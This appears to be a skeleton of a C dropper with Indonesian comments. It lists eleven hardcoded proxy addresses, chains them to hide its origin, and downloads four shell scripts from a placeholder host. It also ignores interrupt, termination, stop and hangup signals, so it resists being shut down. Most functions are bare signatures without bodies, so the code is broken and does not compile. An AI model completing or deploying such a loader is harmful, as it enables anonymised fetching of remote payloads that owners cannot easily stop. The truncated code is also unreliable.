#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <errno.h>
#include <pthread.h>
#include <time.h>
#include <sys/wait.h>
#include <cjson/cJSON.h>

// Menentukan ukuran buffer untuk berbagai operasi
#define BUFFER_SIZE 1024
// Maksimal jumlah proxy yang dapat digunakan
#define MAX_PROXIES 11
// Maksimal jumlah proxy dalam rantai
#define MAX_CHAIN 3

// Daftar proxy yang tersedia untuk digunakan
const char *proxy_list[MAX_PROXIES] = {
    "8.220.204.215:9098",
    "39.104.23.154:9080",
    "8.213.215.187:143",
    "47.238.130.212:8004",
    "13.126.79.133:1080",
    "8.213.197.208:9080",
    "18.135.133.116:1080",
    "15.207.35.241:1080",
    "149.129.226.9:8081",
    "8.130.34.44:8118",
    "82.223.165.28:18356"
};

// Variabel untuk menyimpan jumlah proxy yang tersedia
int proxy_count = MAX_PROXIES;

// Daftar file yang akan diunduh beserta jalur penyimpanan lokal
char *files_to_download[][2] = {
    {"https://linkfike/sse.sh", "./sse.sh"},
    {"https://linkfike/run.sh", "./run.sh"},
    {"https://linkfike/loop.sh", "./loop.sh"},
    {"https://linkfike/main.sh", "./main.sh"}
};

// Handler untuk menangani sinyal yang diterima oleh program
void signal_handler(int signum) {
    printf("\nSinyal %d diterima, tetapi diabaikan.\n", signum);
}

// Menyiapkan handler untuk sinyal SIGINT, SIGTERM, SIGTSTP, SIGHUP
void setup_signal_handlers() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGTSTP, signal_handler);
    signal(SIGHUP, signal_handler);
}

// Struktur untuk menyimpan data yang diterima dari callback cURL
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Struktur untuk menyimpan data yang digunakan dalam thread pengujian proxy
typedef struct {
    const char *proxy;
    const char *original_ip;
    int result;
} ThreadData;

// Callback cURL untuk menulis data ke dalam memori
static size_t WriteMemoryCallback()

// Mengambil alamat IP yang digunakan oleh proxy tertentu
char *get_ip()

// Mengekstrak IP dari respon JSON yang diberikan
char *extract_ip()

// Menguji apakah proxy bekerja dengan membandingkan IP yang diperoleh dengan IP asli
int test_proxy()

// Fungsi thread untuk menguji proxy
void *test_proxy_thread()

// Menguji semua proxy secara multithread
void test_all_proxies_multithread()

// Mengacak urutan proxy
void shuffle_proxies()

// Menyaring proxy yang bekerja
void filter_working_proxies()

// Membangun rantai proxy untuk digunakan
void build_proxy_chain()

// Mencetak rantai proxy yang digunakan
void print_proxy_chain()

// Mengunduh file melalui proxy menggunakan curl
void download_file_via_proxy()

// Fungsi utama yang menggunakan rantai proxy untuk mengunduh file
void use_proxy_chain()

//Fungsi Utama
int main()
